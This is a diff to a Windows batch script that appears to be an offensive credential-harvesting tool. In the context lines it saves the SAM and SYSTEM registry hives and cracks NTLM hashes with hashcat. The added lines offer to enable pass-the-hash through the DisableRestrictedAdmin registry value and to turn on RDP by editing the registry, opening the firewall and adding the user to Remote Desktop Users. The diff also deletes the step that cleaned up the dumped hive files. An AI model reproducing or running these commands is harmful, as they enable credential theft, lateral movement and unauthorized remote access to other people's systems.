@@ -26,6 +26,17 @@ if /i "%mode%"=="V" (
 	reg save HKLM\sam sam.save >nul
 	reg save HKLM\system system.save >nul
 	echo.
+	set /p pth=Enable pass the hash? 
+	if /i "%pth%"=="Y" reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+	echo.
+	set /p rdp=Enable RDP? 
+	if /i "%rdp%"=="Y" (
+		reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0 /f
+		netsh advfirewall firewall set rule group="Remote Desktop" new enable=yes
+		setlocal
+		net localgroup "Remote Desktop Users" "%username%" /add
+		endlocal
+	)
 	pause
 	exit
 )
@@ -80,8 +91,6 @@ if /i "%mode%"=="A" (
 	wsl -u root -e hashcat -m 1000 hash.txt %name% --show >> pass.txt
 	echo ^^ %name%>>pass.txt
 	pause
-	del sam.save
-	del system.save
 	del %name%
 	exit
 )
